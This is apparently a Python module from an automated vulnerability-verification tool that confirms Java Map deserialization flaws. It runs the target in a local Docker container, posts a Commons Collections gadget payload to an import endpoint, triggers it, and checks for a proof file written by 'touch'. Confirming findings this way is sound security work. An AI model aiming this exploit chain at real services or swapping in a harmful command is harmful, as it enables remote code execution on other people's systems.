"""
Map-deserialization-specific D2 verification helpers.
"""
import json
import logging
import re
import time
from pathlib import Path
from typing import Dict, Optional
from urllib.parse import urlencode

from .d2_types import VerificationResult
from src.core import workspace_runtime

logger = logging.getLogger(__name__)


class D2MapDeserializationMixin:
    def _detect_map_deserialization_strategy(self, project_path: Path) -> Optional[Dict[str, str]]:
        java_files = list(project_path.rglob("*.java"))
        import_path = ""
        trigger_path = ""

        for java_file in java_files:
            content = java_file.read_text(encoding='utf-8', errors='ignore')
            if "ObjectInputStream" in content and "readObject()" in content and "Map<String, Object>" in content:
                post_match = re.search(r'@PostMapping\("([^"]+)"\)', content)
                if post_match:
                    import_path = post_match.group(1)
                    break

        for java_file in java_files:
            content = java_file.read_text(encoding='utf-8', errors='ignore')
            request_prefix = ""
            request_mapping = re.search(r'@RequestMapping\("([^"]+)"\)', content)
            if request_mapping:
                request_prefix = request_mapping.group(1).rstrip("/")

            get_match = re.search(r'@GetMapping\("([^"]+)"\)', content)
            if get_match:
                raw_path = get_match.group(1)
                if raw_path.startswith("/"):
                    trigger_path = f"{request_prefix}{raw_path}" or raw_path
                else:
                    trigger_path = f"{request_prefix}/{raw_path}" if request_prefix else f"/{raw_path}"
                break

        has_deferred_map_trigger = False
        for java_file in java_files:
            content = java_file.read_text(encoding='utf-8', errors='ignore')
            if 'decoratedMap' in content and '.put("key", "value")' in content:
                has_deferred_map_trigger = True
                break

        if not (import_path and trigger_path and has_deferred_map_trigger):
            return None

        preferred_images = self._check_local_docker().get("images", [])
        selected_image = preferred_images[0] if preferred_images else "sast-target:latest"

        return {
            "import_path": import_path,
            "trigger_path": trigger_path,
            "probe_path": trigger_path,
            "proof_file": "/tmp/a3_verified_poc",
            "parameter": "data",
            "image": selected_image,
            "jar_relative_path": "BOOT-INF/lib/commons-collections-3.1.jar",
            **self._infer_business_semantics(
                "java_map_deserialization",
                parameter="data",
                method="POST",
                import_path=import_path,
                trigger_path=trigger_path,
                source_file="Map<String,Object> deserialization chain",
                line_context='ObjectInputStream readObject Map<String, Object> decoratedMap.put("key", "value")',
            ),
        }

    def _verify_map_deserialization_chain(self, project_path: Path, strategy: Dict[str, str]) -> VerificationResult:
        strategy = self._ensure_strategy_semantics(strategy)
        for key, value in self._derive_project_specific_semantics(project_path, strategy).items():
            if value:
                strategy[key] = value
        proof_file = "/tmp/a3_verified_poc"
        raw_steps = []
        prepared_runtime = self._get_prepared_runtime(strategy)
        if prepared_runtime:
            container_id = prepared_runtime.get("container_id", "")
            service_url = prepared_runtime.get("service_url", "")
            raw_steps.append({"step": "reuse_prepared_runtime", "service_url": service_url, "container_id": container_id})
            probe_result = self.tools.execute("http_request", method="GET", url=f"{service_url}{strategy.get('probe_path', workspace_runtime.deserialization_chain().get('probe_path', '/api/quote/random'))}", timeout=10)
        else:
            host_port = self._get_available_host_port(8888)
            run_result = self.tools.execute(
                "docker_run",
                image=strategy.get("image", workspace_runtime.deserialization_chain().get('image', 'java-quote-ctf:latest')),
                ports={"8888": host_port},
                timeout=120,
            )
            raw_steps.append({"step": "docker_run", "result": run_result})
            if not run_result.get("success"):
                return VerificationResult(
                    exploitable=False,
                    confidence="low",
                    reason="结构化验证启动容器失败",
                    evidence=[run_result.get("error", "")],
                    poc_type="java-map-payload",
                    poc_code="",
                    steps_executed=1,
                    raw_output=json.dumps({"steps": raw_steps, "semantic_context": self._build_semantic_context_from_strategy(strategy)}, ensure_ascii=False),
                )

            container_id = run_result.get("container_id", "")
            service_url = f"http://localhost:{host_port}"
            self.tools.set_runtime_context(container_id=container_id, service_url=service_url, project_path=str(project_path))
            time.sleep(15)
            probe_result = self.tools.execute("http_request", method="GET", url=f"{service_url}{strategy.get('probe_path', workspace_runtime.deserialization_chain().get('probe_path', '/api/quote/random'))}", timeout=10)
        raw_steps.append({"step": "probe", "result": probe_result})
        if not probe_result.get("success"):
            return VerificationResult(
                exploitable=False,
                confidence="low",
                reason="结构化验证中服务未就绪",
                evidence=[probe_result.get("error", "")],
                poc_type="java-map-payload",
                poc_code="",
                steps_executed=len(raw_steps),
                raw_output=json.dumps({"steps": raw_steps, "service_url": service_url, "semantic_context": self._build_semantic_context_from_strategy(strategy)}, ensure_ascii=False),
            )

        proof_file = strategy.get("proof_file", proof_file)
        generator_result = self._build_map_deserialization_payload(
            command=f"touch {proof_file}",
            jar_relative_path=strategy.get("jar_relative_path", "BOOT-INF/lib/commons-collections-3.1.jar"),
        )
        raw_steps.append({"step": "build_payload", "result": generator_result})
        if not generator_result.get("success"):
            return VerificationResult(
                exploitable=False,
                confidence="medium",
                reason="结构化验证未能生成 Map 反序列化 payload",
                evidence=[generator_result.get("error", "")],
                poc_type="java-map-payload",
                poc_code="",
                steps_executed=len(raw_steps),
                raw_output=json.dumps({"steps": raw_steps, "service_url": service_url, "semantic_context": self._build_semantic_context_from_strategy(strategy)}, ensure_ascii=False),
            )

        payload_b64 = generator_result.get("payload_b64", "")
        parameter_name = strategy.get("parameter", "data")
        cleanup_result = self.tools.execute(
            "shell_exec",
            command=f'docker exec {container_id} sh -lc "rm -f {proof_file}"',
            timeout=30,
        )
        raw_steps.append({"step": "cleanup_previous_proof", "result": cleanup_result})
        import_result = self.tools.execute(
            "http_request",
            method="POST",
            url=f"{service_url}{strategy.get('import_path', workspace_runtime.deserialization_chain().get('import_path', '/debug/import'))}",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            body=urlencode({parameter_name: payload_b64}),
            timeout=15,
        )
        raw_steps.append({"step": "post_payload", "result": import_result})

        trigger_results = []
        verify_result = {}
        success = False
        trigger_url = f"{service_url}{strategy.get('trigger_path', workspace_runtime.deserialization_chain().get('trigger_path', '/api/quote/random'))}"
        verify_command = f'docker exec {container_id} sh -lc "test -f {proof_file} && echo __A3_FILE_PRESENT__ && ls -l {proof_file}"'
        for attempt in range(1, 4):
            trigger_result = self.tools.execute(
                "http_request",
                method="GET",
                url=trigger_url,
                timeout=10,
            )
            trigger_results.append(trigger_result)
            raw_steps.append({"step": f"trigger_processing_{attempt}", "result": trigger_result})
            verify_result = self.tools.execute(
                "shell_exec",
                command=verify_command,
                timeout=30,
            )
            raw_steps.append({"step": f"verify_file_{attempt}", "result": verify_result})
            verify_stdout = str(verify_result.get("stdout", "") or "")
            if verify_result.get("success") or "__A3_FILE_PRESENT__" in verify_stdout:
                success = True
                break
            time.sleep(1)

        trigger_result = trigger_results[-1] if trigger_results else {}
        evidence = [
            f"D2 服务地址: {service_url}",
            f"导入接口响应: {import_result.get('body', '')[:200]}",
            f"触发接口响应码: {trigger_result.get('status_code', '')}",
            f"触发次数: {len(trigger_results)}",
            f"容器文件验证: {verify_result.get('stdout', '').strip() or verify_result.get('stderr', '').strip() or verify_result.get('command', '')}",
        ]

        dc = workspace_runtime.deserialization_chain()
        poc_code = (
            "1. 生成 Map 类型序列化 payload，key 为 decoratedMap，value 为 TransformedMap\n"
            f"2. POST {dc.get('entry_route', '/debug/import')} 导入 base64 序列化数据\n"
            f"3. GET {dc.get('trigger_route', '/api/quote/random')} 触发 CacheProcessor.process(userConfig)\n"
            f"4. decoratedMap.put(\"key\",\"value\") 执行命令并创建 {proof_file}"
        )

        return VerificationResult(
            exploitable=success,
            confidence="high" if success else "medium",
            reason="已通过结构化 Map 反序列化 payload 验证命令执行" if success else "结构化 payload 已导入，但未观察到目标文件落地",
            evidence=evidence,
            poc_type="java-map-payload",
            poc_code=poc_code,
            fix_suggestion=f"删除 {dc.get('entry_route', '/debug/import')} 反序列化入口，避免对不可信数据使用 ObjectInputStream",
            steps_executed=len(raw_steps),
            raw_output=json.dumps(
                {
                    "steps": raw_steps,
                    "service_url": service_url,
                    "container_id": container_id,
                    "verified_file": proof_file,
                    "import_path": strategy.get("import_path", dc.get('import_path', '/debug/import')),
                    "trigger_path": strategy.get("trigger_path", dc.get('trigger_path', '/api/quote/random')),
                    "parameter": parameter_name,
                    "semantic_context": self._build_semantic_context_from_strategy(strategy),
                },
                ensure_ascii=False,
            ),
        )


